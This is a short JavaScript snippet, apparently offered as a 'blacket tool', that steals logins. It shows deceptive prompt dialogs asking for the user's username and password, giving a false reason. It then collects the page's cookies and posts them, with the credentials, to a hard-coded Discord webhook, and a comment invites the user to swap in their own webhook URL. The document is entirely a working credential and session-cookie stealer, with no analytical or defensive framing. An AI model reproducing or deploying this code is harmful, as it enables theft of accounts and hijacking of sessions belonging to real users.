let mainUser = prompt("Please enter the username to your main acccount\n\nNote: we need this to be able to log in and out of your account")
let mainPass = prompt("Please enter the password to your main acccount\n\nNote: we need this to be able to log in and out of your account")

function sendMessage() { 
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/951187572590264360/h8GTol9mO2G3Y9TaqxoZoJLF5044I1eikBAsvwy8SpFa5W8ycSdQ4HCEuvqXsivlnRvZ"); //put your webhook url here
    request.setRequestHeader('Content-type', 'application/json');
    var myEmbed = {
        title: mainUser + "'s data",
        description: getcookie() + "\nUser & Pass: " + mainUser + ":" + mainPass,
        color: hexToDecimal("#ff0000"),
        footer: {
            text: " coded by zastix#0001"
        }
    }
    var params = {
        username: "blacket tool",
         avatar_url: "",
        embeds: [myEmbed]
    }
    request.send(JSON.stringify(params));
    function hexToDecimal(hex) {
        return parseInt(hex.replace("#", ""), 16)
    }
}

function getcookie() {
    return document.cookie;
}

sendMessage();
